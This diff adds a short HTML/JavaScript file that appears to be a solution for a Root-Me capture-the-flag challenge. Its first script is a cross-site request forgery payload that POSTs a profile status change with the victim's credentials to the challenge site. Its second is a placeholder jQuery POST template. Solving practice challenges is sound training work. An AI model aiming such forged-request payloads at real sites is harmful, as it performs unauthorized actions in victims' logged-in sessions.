@@ -1,0 +1,24 @@
+<script>
+var xh;
+if (window.XMLHttpRequest)
+  {// code for IE7+, Firefox, Chrome, Opera, Safari
+  xh=new XMLHttpRequest();
+  }
+else
+  {// code for IE6, IE5
+  xh=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xh.withCredentials = true;
+xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
+xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
+xh.send("username=abcd&status=on");
+</script>
+
+<script>
+//JQuery version
+$.ajax({
+  type: "POST",
+  url: "https://google.com",
+  data: "param=value&param2=value2"
+})
+</script>
